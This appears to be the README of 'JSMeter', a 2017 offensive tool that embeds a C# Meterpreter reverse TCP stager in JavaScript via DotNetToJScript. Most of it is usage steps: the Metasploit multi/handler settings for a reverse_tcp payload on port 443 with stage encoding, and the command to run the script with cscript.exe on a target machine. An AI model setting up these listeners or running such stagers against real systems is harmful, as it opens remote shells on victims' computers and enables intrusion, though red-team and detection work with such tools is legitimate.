```
     ____. _________   _____          __                
    |    |/   _____/  /     \   _____/  |_  ___________ 
    |    |\_____  \  /  \ /  \_/ __ \   __\/ __ \_  __ \
/\__|    |/        \/    Y    \  ___/|  | \  ___/|  | \/
\________/_______  /\____|__  /\___  >__|  \___  >__|   
                 \/         \/     \/          \/       
```
### JavaScript Reversed TCP Meterpreter Stager - by Cn33liz 2017
CSharp Meterpreter Stager build by Cn33liz and embedded within JavaScript using DotNetToJScript from James Forshaw
Should work on x86 as well as x64

```
Usage:
Change RHOST and RPORT settings to suit your needs.

Start Msfconsole:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp <- When run from x64 version of cscript.exe
set PAYLOAD windows/meterpreter/reverse_tcp <- When run from x86 version of cscript.exe
set LHOST 0.0.0.0
set LPORT 443
set EnableUnicodeEncoding true
set EnableStageEncoding true
set ExitOnSession false
exploit -j 

Then run: cscript.exe JSMeter.js on Target
```
